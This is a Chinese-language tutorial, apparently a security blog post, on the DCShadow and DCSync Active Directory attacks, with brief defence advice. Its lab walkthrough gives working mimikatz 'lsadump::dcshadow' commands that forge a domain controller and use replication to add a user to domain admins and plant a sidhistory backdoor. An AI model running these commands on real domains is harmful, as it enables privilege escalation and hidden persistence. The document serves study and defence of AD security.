# DCShadow

## 讲在前面

内网的众多漏洞当中，我们就不得不介绍DCShadow和DCSync。笔者在国内外优秀的研究员的研究基础上，对相对比较优秀的文章做一次总结，尽量言简意赅的将这两个漏洞的意思表达清楚。DCSync已经做过一篇文章的介绍，本篇文章简单回顾。

## DCShadow攻击简介 

在具备域管理员权限的前提下，攻击者可以创建伪造的域控制器，将预先设定好的对象或对象属性同步复制到正在运行的域服务器中

* 在目标AD中注册一个伪造的DC
* 使伪造的DC被其他DC认可，能够参与域复制
* 强制触发域复制，将预先设定好的对象或对象属性同步复制到其他DC中

### 举例： 

测试环境：dc机器2008r2 x64、伪装机器：win7 x64

准备条件：（两个窗口）

1、win7 system权限 \(1号窗口\)，可以利用psexec -s cmd调system会话，也可以用mimikatz运行驱动模式，确保所有线程都运行在system上  


```text
!+

!processtoken

token::whoami

```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

2. win7 域管权限 （2号窗口）

在win7 中利用psexec 调用cmd即可：

```text
psexec -u pingpig\administrator cmd.exe
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

#### 利用方式一：更改属性的描述值

```text
lsadump::dcshadow /object:CN=dc,CN=Users,DC=pingpig,DC=com /attribute:description /value:"helloworld"

执行域复制：

lsadump::dcshadow /push
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

#### 利用方式二：添加域管

```text
lsadump::dcshadow /object:CN=dc,CN=Users,DC=pingpig,DC=com /attribute:primarygroupid/value:512

执行域复制：

lsadump::dcshadow /push
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

#### 利用方式三：添加sidhistory后门

```text

sid为域管administartor的sid

lsadump::dcshadow /object:CN=dc,CN=Users,DC=pingpig,DC=com /attribute:sidhistory /value:S-1-5-21-1900941692-2128706383-2830697502-500


执行域复制：

lsadump::dcshadow /push
```

![](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

### 防御建议：

监控Configuration区中的权限更改情况

对AD配置的严格审核和更改监测

严格配置访问

### 简短小结

我们需要注意的DCShadow知识：  


DCShadow不是漏洞，而是将非法数据注入AD的一种新方法

DCSync无法做到在AD域内注入新对象，DCShadow做到了  


[Knowledge Consistency Checker（KCC，知识一致性检查）](https://technet.microsoft.com/en-us/library/cc961781.aspx?f=255&MSPPError=-2147217396)这个进程可以完成数据复制任务  


Dcshadow 的利用我们可以做很多事情，包括ldap用户的修改，添加后门（sidhistory后门， AdminSDHolder后门，acl后门等等），在碰到域防护较为严格的时候，往往能起到很好的bypass的效果。  


参考文章：

[DCShadow介绍](https://www.anquanke.com/post/id/146551#h2-3)

[DCShadow-攻击原理](https://www.anquanke.com/post/id/96704#h3-9)

[DCShadow-测试](https://zhuanlan.zhihu.com/p/33671772)

## DCSync攻击简介

在具备域管理权限的前提下，攻击者可以利用域数据同步复制发起[GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) 请求获得想要的用户口令信息，攻击对象不能是只读域控制器（RODC）

攻击流程：

* 发现域控制器以请求复制
* 使用[GetNCChanges](https://wiki.samba.org/index.php/DRSUAPI) 函数请求用户复制 
* DC将复制数据（包括密码哈希）返回给请求者

[DCSync攻击与检测](https://blog.csdn.net/Ping_Pig/article/details/108906720)  


